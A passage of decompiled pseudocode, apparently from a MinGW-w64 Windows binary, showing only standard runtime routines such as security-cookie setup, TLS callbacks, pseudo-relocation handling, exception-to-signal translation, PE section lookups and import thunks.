    "  unsigned int v3; // ecx",
    "",
    "  v2 = 0;",
    "  do",
    "    v3 = v2++;",
    "  while ( qword_62749AB0[v2] );",
    "  if ( v3 )",
    "  {",
    "    v0 = (void (**)(void))&qword_62749AB0[v3];",
    "    v1 = &qword_62749AB0[v3 - (unsigned __int64)(v3 - 1) - 1];",
    "    do",
    "      (*v0--)();",
    "    while ( v0 != (void (**)(void))v1 );",
    "  }",
    "  JUMPOUT(0x627413A0);",
    "}",
    "",
    "",
    "void sub_627484D0()",
    "{",
    "  if ( !dword_62751270 )",
    "  {",
    "    dword_62751270 = 1;",
    "    sub_62748460();",
    "  }",
    "}",
    "",
    "",
    "LONGLONG sub_627484F0()",
    "{",
    "  LONGLONG result; // rax",
    "  struct _FILETIME v1; // rsi",
    "  DWORD CurrentProcessId; // ebp",
    "  DWORD CurrentThreadId; // edi",
    "  DWORD TickCount; // r12d",
    "  unsigned __int64 v5; // rdx",
    "  struct _FILETIME SystemTimeAsFileTime; // [rsp+20h] [rbp-38h] BYREF",
    "  LARGE_INTEGER PerformanceCount[6]; // [rsp+28h] [rbp-30h] BYREF",
    "",
    "  result = 0x2B992DDFA232LL;",
    "  SystemTimeAsFileTime = 0;",
    "  if ( qword_6274A690 == 0x2B992DDFA232LL )",
    "  {",
    "    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);",
    "    v1 = SystemTimeAsFileTime;",
    "    CurrentProcessId = GetCurrentProcessId();",
    "    CurrentThreadId = GetCurrentThreadId();",
    "    TickCount = GetTickCount();",
    "    QueryPerformanceCounter(PerformanceCount);",
    "    result = (PerformanceCount[0].QuadPart",
    "            ^ *(_QWORD *)&v1",
    "            ^ CurrentProcessId",
    "            ^ CurrentThreadId",
    "            ^ TickCount)",
    "           & 0xFFFFFFFFFFFFLL;",
    "    if ( result == 0x2B992DDFA232LL )",
    "    {",
    "      v5 = 0xFFFFD466D2205DCCuLL;",
    "      result = 0x2B992DDFA233LL;",
    "    }",
    "    else",
    "    {",
    "      v5 = ~result;",
    "    }",
    "    qword_6274A690 = result;",
    "    qword_6274A6A0 = v5;",
    "  }",
    "  else",
    "  {",
    "    qword_6274A6A0 = ~qword_6274A690;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall  sub_627485D0(DWORD64 a1)",
    "{",
    "  ULONG64 Rip; // rsi",
    "  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v3; // r9",
    "  HANDLE CurrentProcess; // rax",
    "  unsigned __int64 ImageBase; // [rsp+48h] [rbp-28h] BYREF",
    "  unsigned __int64 EstablisherFrame; // [rsp+50h] [rbp-20h] BYREF",
    "  IRecordInfo HandlerData; // [rsp+58h] [rbp-18h] BYREF",
    "  __int64 v8; // [rsp+60h] [rbp-10h]",
    "  __int64 v9; // [rsp+68h] [rbp-8h]",
    "  char vars8; // [rsp+78h] [rbp+8h] BYREF",
    "  DWORD64 retaddr; // [rsp+88h] [rbp+18h]",
    "",
    "  RtlCaptureContext(&ContextRecord);",
    "  Rip = ContextRecord.Rip;",
    "  v3 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, 0);",
    "  if ( v3 )",
    "  {",
    "    RtlVirtualUnwind(0, ImageBase, Rip, v3, &ContextRecord, (PVOID *)&HandlerData.lpVtbl, &EstablisherFrame, 0);",
    "  }",
    "  else",
    "  {",
    "    ContextRecord.Rip = retaddr;",
    "    ContextRecord.Rsp = (DWORD64)&vars8;",
    "  }",
    "  ContextRecord.Rcx = a1;",
    "  qword_62751770 = ContextRecord.Rip;",
    "  qword_62751760 = 0x1C0000409LL;",
    "  v8 = qword_6274A690;",
    "  v9 = qword_6274A6A0;",
    "  SetUnhandledExceptionFilter(0);",
    "  UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo);",
    "  CurrentProcess = GetCurrentProcess();",
    "  TerminateProcess(CurrentProcess, 0xC0000409);",
    "  abort();",
    "}",
    "",
    "",
    "__int64 __fastcall TlsCallback_1(__int64 a1, int a2)",
    "{",
    "  if ( a2 != 3 && a2 )",
    "    return 1;",
    "  sub_62749300();",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall TlsCallback_0(__int64 a1, int a2)",
    "{",
    "  if ( unk_6274A680 != 2 )",
    "    unk_6274A680 = 2;",
    "  if ( a2 == 1 )",
    "    sub_62749300();",
    "  return 1;",
    "}",
    "",
    "",
    "void  sub_627487A0(char *Format, ...)",
    "{",
    "  FILE *v2; // rax",
    "  FILE *v3; // rax",
    "  va_list va; // [rsp+58h] [rbp+10h] BYREF",
    "",
    "  va_start(va, Format);",
    "  v2 = (FILE *)sub_62749A60(2);",
    "  fwrite(\"Mingw-w64 runtime failure:\\n\", 1u, 0x1Bu, v2);",
    "  v3 = (FILE *)sub_62749A60(2);",
    "  vfprintf(v3, Format, va);",
    "  abort();",
    "}",
    "",
    "",
    "int __fastcall sub_62748810(_QWORD *a1, char *a2, unsigned int a3)",
    "{",
    "  __int64 v3; // rdi",
    "  int v7; // ecx",
    "  _QWORD *v8; // rax",
    "  __int64 v9; // rbp",
    "  __int64 v10; // rdi",
    "  __int64 v11; // rax",
    "  const void *v12; // rcx",
    "  unsigned __int64 v13; // rcx",
    "  char *v14; // r12",
    "  char *v15; // rsi",
    "  unsigned int v16; // ebx",
    "  unsigned int v17; // ebx",
    "  __int64 v18; // rdx",
    "  void *v19; // rcx",
    "  SIZE_T v20; // rdx",
    "  __int64 v21; // rdi",
    "  DWORD LastError; // eax",
    "  _BYTE Buffer[88]; // [rsp+20h] [rbp-58h] BYREF",
    "",
    "  v3 = dword_62751824;",
    "  if ( dword_62751824 <= 0 )",
    "  {",
    "    v3 = 0;",
    "LABEL_6:",
    "    v9 = sub_62749510(a1);",
    "    if ( !v9 )",
    "      sub_627487A0(\"Address %p has no image-section\", a1);",
    "    v10 = 40 * v3;",
    "    v11 = v10 + qword_62751828;",
    "    *(_QWORD *)(v11 + 32) = v9;",
    "    *(_DWORD *)v11 = 0;",
    "    v12 = (const void *)(sub_62749640() + *(unsigned int *)(v9 + 12));",
    "    *(_QWORD *)(qword_62751828 + v10 + 24) = v12;",
    "    if ( !VirtualQuery(v12, (PMEMORY_BASIC_INFORMATION)Buffer, 0x30u) )",
    "      sub_627487A0(",
    "        \"  VirtualQuery failed for %d bytes at address %p\",",
    "        *(_DWORD *)(v9 + 8),",
    "        *(const void **)(qword_62751828 + v10 + 24));",
    "    LODWORD(v8) = *(_DWORD *)&Buffer[36];",
    "    if ( ((*(_DWORD *)&Buffer[36] - 64) & 0xFFFFFFBF) != 0 )",
    "    {",
    "      LODWORD(v8) = (*(_DWORD *)&Buffer[36] - 4) & 0xFFFFFFFB;",
    "      if ( (_DWORD)v8 )",
    "      {",
    "        v19 = *(void **)Buffer;",
    "        v20 = *(_QWORD *)&Buffer[24];",
    "        v21 = qword_62751828 + v10;",
    "        *(_QWORD *)(v21 + 8) = *(_QWORD *)Buffer;",
    "        *(_QWORD *)(v21 + 16) = v20;",
    "        LODWORD(v8) = VirtualProtect(v19, v20, 0x40u, (PDWORD)v21);",
    "        if ( !(_DWORD)v8 )",
    "        {",
    "          LastError = GetLastError();",
    "          sub_627487A0(\"  VirtualProtect failed with code 0x%x\", LastError);",
    "        }",
    "      }",
    "    }",
    "    ++dword_62751824;",
    "  }",
    "  else",
    "  {",
    "    v7 = 0;",
    "    v8 = (_QWORD *)(qword_62751828 + 24);",
    "    while ( (unsigned __int64)a1 < *v8 || (unsigned __int64)a1 >= (unsigned __int64)*(unsigned int *)(v8[1] + 8LL) + *v8 )",
    "    {",
    "      ++v7;",
    "      v8 += 5;",
    "      if ( v7 == dword_62751824 )",
    "        goto LABEL_6;",
    "    }",
    "  }",
    "  if ( a3 >= 8 )",
    "  {",
    "    v13 = (unsigned __int64)(a1 + 1) & 0xFFFFFFFFFFFFFFF8uLL;",
    "    *a1 = *(_QWORD *)a2;",
    "    LODWORD(v8) = a3;",
    "    *(_QWORD *)((char *)a1 + a3 - 8) = *(_QWORD *)&a2[a3 - 8];",
    "    v14 = (char *)a1 - v13;",
    "    v15 = (char *)(a2 - v14);",
    "    v16 = ((_DWORD)v14 + a3) & 0xFFFFFFF8;",
    "    if ( v16 >= 8 )",
    "    {",
    "      v17 = v16 & 0xFFFFFFF8;",
    "      LODWORD(v8) = 0;",
    "      do",
    "      {",
    "        v18 = (unsigned int)v8;",
    "        LODWORD(v8) = (_DWORD)v8 + 8;",
    "        *(_QWORD *)(v13 + v18) = *(_QWORD *)&v15[v18];",
    "      }",
    "      while ( (unsigned int)v8 < v17 );",
    "    }",
    "  }",
    "  else if ( (a3 & 4) != 0 )",
    "  {",
    "    *(_DWORD *)a1 = *(_DWORD *)a2;",
    "    LODWORD(v8) = *(_DWORD *)&a2[a3 - 4];",
    "    *(_DWORD *)((char *)a1 + a3 - 4) = (_DWORD)v8;",
    "  }",
    "  else if ( a3 )",
    "  {",
    "    LODWORD(v8) = (unsigned __int8)*a2;",
    "    *(_BYTE *)a1 = (_BYTE)v8;",
    "    if ( (a3 & 2) != 0 )",
    "    {",
    "      LODWORD(v8) = *(unsigned __int16 *)&a2[a3 - 2];",
    "      *(_WORD *)((char *)a1 + a3 - 2) = (_WORD)v8;",
    "    }",
    "  }",
    "  return (int)v8;",
    "}",
    "",
    "",
    "void sub_62748A20()",
    "{",
    "  signed __int64 v0; // rax",
    "  void *v1; // rsp",
    "  char v2; // [rsp+20h] [rbp-60h] BYREF",
    "",
    "  if ( !dword_62751820 )",
    "  {",
    "    dword_62751820 = 1;",
    "    sub_627495A0();",
    "    v0 = sub_627497D0();",
    "    dword_62751824 = 0;",
    "    v1 = alloca(v0);",
    "    qword_62751828 = (__int64)&v2;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62748D10(unsigned int *a1)",
    "{",
    "  unsigned int v1; // eax",
    "  _crt_signal_t v2; // rax",
    "  __int64 v3; // rdx",
    "  unsigned int v4; // r8d",
    "  _crt_signal_t v6; // rax",
    "  _crt_signal_t v7; // rax",
    "",
    "  v1 = *a1;",
    "  if ( *a1 > 0xC0000096 )",
    "    return 1;",
    "  if ( v1 > 0xC000008B )",
    "  {",
    "    switch ( v1 )",
    "    {",
    "      case 0xC000008D:",
    "      case 0xC000008E:",
    "      case 0xC000008F:",
    "      case 0xC0000090:",
    "      case 0xC0000091:",
    "      case 0xC0000093:",
    "        v2 = signal(8, 0);",
    "        if ( v2 != (_crt_signal_t)1 )",
    "          goto LABEL_17;",
    "        signal(8, (_crt_signal_t)1);",
    "        sub_627497C0();",
    "        goto LABEL_6;",
    "      case 0xC0000094:",
    "        v2 = signal(8, 0);",
    "        if ( v2 == (_crt_signal_t)1 )",
    "        {",
    "          signal(8, (_crt_signal_t)1);",
    "          return 0;",
    "        }",
    "        else",
    "        {",
    "LABEL_17:",
    "          v4 = 1;",
    "          if ( v2 )",
    "          {",
    "            ((void (__fastcall *)(__int64, __int64, __int64))v2)(8, v3, 1);",
    "            return 0;",
    "          }",
    "        }",
    "        return v4;",
    "      case 0xC0000096:",
    "        goto LABEL_12;",
    "      default:",
    "LABEL_6:",
    "        v4 = 0;",
    "        break;",
    "    }",
    "    return v4;",
    "  }",
    "  if ( v1 == -1073741819 )",
    "  {",
    "    v7 = signal(11, 0);",
    "    if ( v7 == (_crt_signal_t)1 )",
    "    {",
    "      signal(11, (_crt_signal_t)1);",
    "      return 0;",
    "    }",
    "    if ( !v7 )",
    "      return 4;",
    "    ((void (__fastcall *)(__int64))v7)(11);",
    "    return 0;",
    "  }",
    "  if ( v1 > 0xC0000005 )",
    "  {",
    "    v4 = 0;",
    "    if ( v1 != -1073741816 )",
    "    {",
    "      if ( v1 == -1073741795 )",
    "      {",
    "LABEL_12:",
    "        v6 = signal(4, 0);",
    "        if ( v6 == (_crt_signal_t)1 )",
    "        {",
    "          signal(4, (_crt_signal_t)1);",
    "          return 0;",
    "        }",
    "        if ( v6 )",
    "        {",
    "          ((void (__fastcall *)(__int64))v6)(4);",
    "          return 0;",
    "        }",
    "        return 4;",
    "      }",
    "      return 1;",
    "    }",
    "    return v4;",
    "  }",
    "  return v1 != -2147483646;",
    "}",
    "",
    "",
    "__int64 sub_62748ED0()",
    "{",
    "  ULONG64 v0; // rsi",
    "  __int64 result; // rax",
    "  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v2; // rbx",
    "  __int64 v3; // r12",
    "  _DWORD *v4; // rdi",
    "  DWORD v5; // edx",
    "  DWORD v6; // edx",
    "  int v7; // eax",
    "  __int64 v8; // rax",
    "  ULONG v9; // edx",
    "",
    "  v0 = sub_62749640();",
    "  result = (unsigned int)dword_62751848;",
    "  if ( !dword_62751848 && v0 )",
    "  {",
    "    dword_62751848 = 1;",
    "    if ( !sub_62749470(\".pdata\") )",
    "    {",
    "      v2 = &FunctionTable;",
    "      v3 = 0;",
    "      memset(&FunctionTable, 0, 0x180u);",
    "      memset(&unk_62751860, 0, 0x100u);",
    "      v4 = &unk_62751860;",
    "      while ( 1 )",
    "      {",
    "        v8 = sub_627495D0(v3);",
    "        if ( !v8 )",
    "          break;",
    "        *(_BYTE *)v4 = 9;",
    "        ++v3;",
    "        ++v2;",
    "        v4[1] = (unsigned int)sub_62748D10 - v0;",
    "        v5 = *(_DWORD *)(v8 + 12);",
    "        v2[-1].BeginAddress = v5;",
    "        v6 = *(_DWORD *)(v8 + 8) + v5;",
    "        v7 = (int)v4;",
    "        v4 += 2;",
    "        v2[-1].EndAddress = v6;",
    "        v2[-1].UnwindInfoAddress = v7 - v0;",
    "        if ( v3 == 32 )",
    "        {",
    "          v9 = 32;",
    "          goto LABEL_12;",
    "        }",
    "      }",
    "      if ( !v3 )",
    "        return 1;",
    "      v9 = v3;",
    "LABEL_12:",
    "      RtlAddFunctionTable(&FunctionTable, v9, v0);",
    "    }",
    "    return 1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62748FD0(unsigned int **a1)",
    "{",
    "  unsigned int v1; // eax",
    "  _crt_signal_t v3; // rax",
    "  __int64 result; // rax",
    "  _crt_signal_t v5; // rax",
    "  _crt_signal_t v6; // rax",
    "",
    "  v1 = **a1;",
    "  if ( (v1 & 0x20FFFFFF) == 0x20474343 && ((*a1)[1] & 1) == 0 )",
    "    return 0xFFFFFFFFLL;",
    "  if ( v1 > 0xC0000096 )",
    "    goto LABEL_16;",
    "  if ( v1 <= 0xC000008B )",
    "  {",
    "    if ( v1 == -1073741819 )",
    "    {",
    "      v6 = signal(11, 0);",
    "      if ( v6 == (_crt_signal_t)1 )",
    "      {",
    "        signal(11, (_crt_signal_t)1);",
    "        return 0xFFFFFFFFLL;",
    "      }",
    "      if ( v6 )",
    "      {",
    "        ((void (__fastcall *)(__int64))v6)(11);",
    "        return 0xFFFFFFFFLL;",
    "      }",
    "      goto LABEL_16;",
    "    }",
    "    if ( v1 > 0xC0000005 )",
    "    {",
    "      if ( v1 != -1073741816 )",
    "      {",
    "        if ( v1 == -1073741795 )",
    "        {",
    "LABEL_12:",
    "          v5 = signal(4, 0);",
    "          if ( v5 == (_crt_signal_t)1 )",
    "          {",
    "            signal(4, (_crt_signal_t)1);",
    "            return 0xFFFFFFFFLL;",
    "          }",
    "          if ( v5 )",
    "          {",
    "            ((void (__fastcall *)(__int64))v5)(4);",
    "            return 0xFFFFFFFFLL;",
    "          }",
    "        }",
    "        goto LABEL_16;",
    "      }",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "    if ( v1 == -2147483646 )",
    "      return 0xFFFFFFFFLL;",
    "LABEL_16:",
    "    if ( qword_62751840 )",
    "      return qword_62751840(a1);",
    "    else",
    "      return 0;",
    "  }",
    "  switch ( v1 )",
    "  {",
    "    case 0xC000008D:",
    "    case 0xC000008E:",
    "    case 0xC000008F:",
    "    case 0xC0000090:",
    "    case 0xC0000091:",
    "    case 0xC0000093:",
    "      v3 = signal(8, 0);",
    "      if ( v3 != (_crt_signal_t)1 )",
    "        goto LABEL_22;",
    "      signal(8, (_crt_signal_t)1);",
    "      sub_627497C0();",
    "      return 0xFFFFFFFFLL;",
    "    case 0xC0000094:",
    "      v3 = signal(8, 0);",
    "      if ( v3 == (_crt_signal_t)1 )",
    "      {",
    "        signal(8, (_crt_signal_t)1);",
    "        result = 0xFFFFFFFFLL;",
    "      }",
    "      else",
    "      {",
    "LABEL_22:",
    "        if ( !v3 )",
    "          goto LABEL_16;",
    "        ((void (__fastcall *)(__int64))v3)(8);",
    "        result = 0xFFFFFFFFLL;",
    "      }",
    "      break;",
    "    case 0xC0000096:",
    "      goto LABEL_12;",
    "    default:",
    "      return 0xFFFFFFFFLL;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void sub_62749180()",
    "{",
    "  _QWORD *v0; // rbx",
    "  LPVOID Value; // r12",
    "",
    "  EnterCriticalSection(&CriticalSection);",
    "  v0 = Block;",
    "  if ( Block )",
    "  {",
    "    do",
    "    {",
    "      Value = TlsGetValue(*(_DWORD *)v0);",
    "      if ( !GetLastError() && Value )",
    "        ((void (__fastcall *)(LPVOID))v0[1])(Value);",
    "      v0 = (_QWORD *)v0[2];",
    "    }",
    "    while ( v0 );",
    "  }",
    "  LeaveCriticalSection(&CriticalSection);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627491F0(int a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "  _QWORD *v5; // rax",
    "  _QWORD *v6; // rbx",
    "  void *v7; // rax",
    "",
    "  result = (unsigned int)dword_62751AE8;",
    "  if ( dword_62751AE8 )",
    "  {",
    "    v5 = calloc(1u, 0x18u);",
    "    v6 = v5;",
    "    if ( v5 )",
    "    {",
    "      *(_DWORD *)v5 = a1;",
    "      v5[1] = a2;",
    "      EnterCriticalSection(&CriticalSection);",
    "      v7 = Block;",
    "      Block = v6;",
    "      v6[2] = v7;",
    "      LeaveCriticalSection(&CriticalSection);",
    "      return 0;",
    "    }",
    "    else",
    "    {",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749270(int a1)",
    "{",
    "  _QWORD *v3; // rcx",
    "  _QWORD *v4; // rdx",
    "  __int64 v5; // rax",
    "",
    "  if ( !dword_62751AE8 )",
    "    return 0;",
    "  EnterCriticalSection(&CriticalSection);",
    "  v3 = Block;",
    "  if ( Block )",
    "  {",
    "    v4 = 0;",
    "    while ( 1 )",
    "    {",
    "      v5 = v3[2];",
    "      if ( *(_DWORD *)v3 == a1 )",
    "        break;",
    "      v4 = v3;",
    "      if ( !v5 )",
    "        goto LABEL_11;",
    "      v3 = (_QWORD *)v3[2];",
    "    }",
    "    if ( v4 )",
    "      v4[2] = v5;",
    "    else",
    "      Block = (void *)v3[2];",
    "    free(v3);",
    "  }",
    "LABEL_11:",
    "  LeaveCriticalSection(&CriticalSection);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749300(__int64 a1, unsigned int a2)",
    "{",
    "  void *v3; // rbx",
    "  void *v4; // rcx",
    "",
    "  if ( a2 == 2 )",
    "  {",
    "    sub_627497C0();",
    "    return 1;",
    "  }",
    "  else",
    "  {",
    "    if ( a2 > 2 )",
    "    {",
    "      if ( a2 == 3 && dword_62751AE8 )",
    "        sub_62749180();",
    "    }",
    "    else if ( a2 )",
    "    {",
    "      if ( !dword_62751AE8 )",
    "        InitializeCriticalSection(&CriticalSection);",
    "      dword_62751AE8 = 1;",
    "    }",
    "    else",
    "    {",
    "      if ( dword_62751AE8 )",
    "        sub_62749180();",
    "      if ( dword_62751AE8 == 1 )",
    "      {",
    "        v3 = Block;",
    "        while ( v3 )",
    "        {",
    "          v4 = v3;",
    "          v3 = (void *)*((_QWORD *)v3 + 2);",
    "          free(v4);",
    "        }",
    "        Block = 0;",
    "        dword_62751AE8 = 0;",
    "        DeleteCriticalSection(&CriticalSection);",
    "      }",
    "    }",
    "    return 1;",
    "  }",
    "}",
    "",
    "",
    "const char *__fastcall sub_62749470(char *Str2)",
    "{",
    "  const char *v2; // r12",
    "  __int64 v3; // rcx",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rsi",
    "",
    "  if ( strlen(Str2) <= 8 )",
    "  {",
    "    v2 = 0;",
    "    if ( *(_WORD *)off_6274DFD0 != 23117 || !(unsigned int)sub_627493E0() )",
    "      return v2;",
    "    v4 = *(int *)(v3 + 60) + v3;",
    "    v2 = (const char *)(v4 + *(unsigned __int16 *)(v4 + 20) + 24);",
    "    if ( *(_WORD *)(v4 + 6) )",
    "    {",
    "      v5 = (__int64)&v2[40 * *(unsigned __int16 *)(v4 + 6)];",
    "      while ( strncmp(v2, Str2, 8u) )",
    "      {",
    "        v2 += 40;",
    "        if ( v2 == (const char *)v5 )",
    "          return 0;",
    "      }",
    "      return v2;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749510(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // r8",
    "  __int64 v3; // r9",
    "  __int64 v4; // r10",
    "  unsigned __int64 v5; // rcx",
    "  __int64 v6; // r10",
    "  __int64 v7; // r9",
    "  unsigned __int64 v8; // rdx",
    "",
    "  v2 = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 && (unsigned int)sub_627493E0(off_6274DFD0, a2, 0, a1) )",
    "  {",
    "    v5 = v3 - v4;",
    "    v6 = *(int *)(v4 + 60) + v4;",
    "    v2 = v6 + *(unsigned __int16 *)(v6 + 20) + 24;",
    "    if ( *(_WORD *)(v6 + 6) )",
    "    {",
    "      v7 = v2 + 40LL * ((unsigned int)*(unsigned __int16 *)(v6 + 6) - 1) + 40;",
    "      while ( 1 )",
    "      {",
    "        v8 = *(unsigned int *)(v2 + 12);",
    "        if ( v5 >= v8 && v5 < (unsigned int)(*(_DWORD *)(v2 + 8) + v8) )",
    "          break;",
    "        v2 += 40;",
    "        if ( v2 == v7 )",
    "          return 0;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      return 0;",
    "    }",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627495A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v5; // rcx",
    "",
    "  result = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 )",
    "  {",
    "    result = sub_627493E0(off_6274DFD0, a2, a3, a4);",
    "    if ( (_DWORD)result )",
    "      return *(unsigned __int16 *)(*(int *)(v5 + 60) + v5 + 6);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627495D0(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // r8",
    "  __int64 v3; // rcx",
    "  __int64 v4; // r9",
    "  __int64 v5; // rcx",
    "  __int64 v6; // rax",
    "",
    "  v2 = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 && (unsigned int)sub_627493E0(off_6274DFD0, a2, 0, a1) )",
    "  {",
    "    v5 = *(int *)(v3 + 60) + v3;",
    "    v2 = v5 + *(unsigned __int16 *)(v5 + 20) + 24;",
    "    if ( *(_WORD *)(v5 + 6) )",
    "    {",
    "      v6 = v2 + 40LL * ((unsigned int)*(unsigned __int16 *)(v5 + 6) - 1) + 40;",
    "      do",
    "      {",
    "        if ( (*(_BYTE *)(v2 + 39) & 0x20) != 0 )",
    "        {",
    "          if ( !v4 )",
    "            return v2;",
    "          --v4;",
    "        }",
    "        v2 += 40;",
    "      }",
    "      while ( v2 != v6 );",
    "    }",
    "    return 0;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749640(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 v4; // r8",
    "  __int64 v5; // rcx",
    "",
    "  v4 = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 && (unsigned int)sub_627493E0(off_6274DFD0, a2, 0, a4) )",
    "    return v5;",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749670(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v3; // r8",
    "  __int64 v4; // r9",
    "  unsigned __int64 v5; // rcx",
    "  __int64 v6; // r9",
    "  _DWORD *v7; // rax",
    "  __int64 v8; // r9",
    "  unsigned __int64 v9; // r8",
    "",
    "  result = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 )",
    "  {",
    "    result = sub_627493E0(off_6274DFD0, a2, a1, off_6274DFD0);",
    "    if ( (_DWORD)result )",
    "    {",
    "      v5 = v3 - v4;",
    "      v6 = *(int *)(v4 + 60) + v4;",
    "      v7 = (_DWORD *)(v6 + *(unsigned __int16 *)(v6 + 20) + 24);",
    "      if ( *(_WORD *)(v6 + 6) )",
    "      {",
    "        v8 = (__int64)&v7[10 * *(unsigned __int16 *)(v6 + 6)];",
    "        while ( 1 )",
    "        {",
    "          v9 = (unsigned int)v7[3];",
    "          if ( v5 >= v9 && v5 < (unsigned int)(v7[2] + v9) )",
    "            break;",
    "          v7 += 10;",
    "          if ( v7 == (_DWORD *)v8 )",
    "            return 0;",
    "        }",
    "        return v7[9] >= 0;",
    "      }",
    "      else",
    "      {",
    "        return 0;",
    "      }",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749700(unsigned int a1, __int64 a2)",
    "{",
    "  __int64 v2; // r9",
    "  int v3; // r8d",
    "  __int64 v4; // r11",
    "  __int64 v5; // rcx",
    "  unsigned __int64 v6; // rax",
    "  __int64 v7; // rdx",
    "  int v8; // ecx",
    "  __int64 v9; // r10",
    "  unsigned __int64 v10; // r9",
    "  __int64 i; // rax",
    "",
    "  v2 = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 )",
    "  {",
    "    if ( (unsigned int)sub_627493E0(off_6274DFD0, a2, a1, 0) )",
    "    {",
    "      v5 = v4 + *(int *)(v4 + 60);",
    "      v6 = *(unsigned int *)(v5 + 144);",
    "      if ( (_DWORD)v6 )",
    "      {",
    "        v7 = v5 + *(unsigned __int16 *)(v5 + 20) + 24;",
    "        v8 = *(unsigned __int16 *)(v5 + 6);",
    "        if ( v8 )",
    "        {",
    "          v9 = v7 + 40LL * (unsigned int)(v8 - 1) + 40;",
    "          while ( 1 )",
    "          {",
    "            v10 = *(unsigned int *)(v7 + 12);",
    "            if ( v6 >= v10 && v6 < (unsigned int)(*(_DWORD *)(v7 + 8) + v10) )",
    "              break;",
    "            v7 += 40;",
    "            if ( v7 == v9 )",
    "              return 0;",
    "          }",
    "          for ( i = v4 + v6; *(_DWORD *)(i + 4) || *(_DWORD *)(i + 12); i += 20 )",
    "          {",
    "            if ( v3 <= 0 )",
    "              return v4 + *(unsigned int *)(i + 12);",
    "            --v3;",
    "          }",
    "          return 0;",
    "        }",
    "      }",
    "    }",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "void sub_627497C0()",
    "{",
    "  __asm { fninit }",
    "}",
    "",
    "",
    "void *__fastcall sub_627497D0()",
    "{",
    "  unsigned __int64 v0; // rax",
    "  __int64 *v1; // rcx",
    "  _UNKNOWN *retaddr; // [rsp+8h] [rbp+0h]",
    "  __int64 v4; // [rsp+20h] [rbp+18h] BYREF",
    "",
    "  v1 = &v4;",
    "  if ( v0 >= 0x1000 )",
    "  {",
    "    do",
    "    {",
    "      v1 -= 512;",
    "      *v1 = *v1;",
    "      v0 -= 4096LL;",
    "    }",
    "    while ( v0 > 0x1000 );",
    "  }",
    "  *(__int64 *)((char *)v1 - v0) = *(__int64 *)((char *)v1 - v0);",
    "  return retaddr;",
    "}",
    "",
    "",
    "__int64 sub_62749810()",
    "{",
    "  return 1;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount)",
    "{",
    "}// attributes: thunk",
    "size_t __cdecl wcslen(const wchar_t *String)",
    "{",
    "}// attributes: thunk",
    "wchar_t *__cdecl wcscpy(wchar_t *Destination, const wchar_t *Source)",
    "{",
    "}// attributes: thunk",
    "int __cdecl wcscmp(const wchar_t *String1, const wchar_t *String2)",
    "{",
    "}// attributes: thunk",
    "wchar_t *__cdecl wcscat(wchar_t *Destination, const wchar_t *Source)",
    "{",
    "}// attributes: thunk",
    "int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList)",
    "{",
    "}// attributes: thunk",
    "int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount)",
    "{",
    "}// attributes: thunk",
    "size_t __cdecl strlen(const char *Str)",
    "{",
    "}// attributes: thunk",
    "char *__cdecl strcpy(char *Destination, const char *Source)",
    "{",
    "}// attributes: thunk",
    "char *__cdecl strcat(char *Destination, const char *Source)",
    "{",
    "}// attributes: thunk",
    "void __cdecl srand(unsigned int Seed)",
    "{",
    "}// attributes: thunk",
    "_crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function)",
    "{",
    "}// attributes: thunk",
    "int __cdecl rand()",
    "{",
    "}// attributes: thunk",
    "void *__cdecl memset(void *a1, int Val, size_t Size)",
    "{",
    "}// attributes: thunk",
    "void *__cdecl memcpy(void *a1, const void *Src, size_t Size)",
    "{",
    "}// attributes: thunk",
    "size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream)",
    "{",
    "}// attributes: thunk",
    "void __cdecl free(void *Block)",
    "{",
    "}// attributes: thunk",
    "void *__cdecl calloc(size_t Count, size_t Size)",
    "{",
    "}// attributes: thunk",
    "void __cdecl  abort()",
    "{",
    "}// attributes: thunk",
    "void __cdecl initterm(_PVFV *First, _PVFV *Last)",
    "{",
    "}// attributes: thunk",
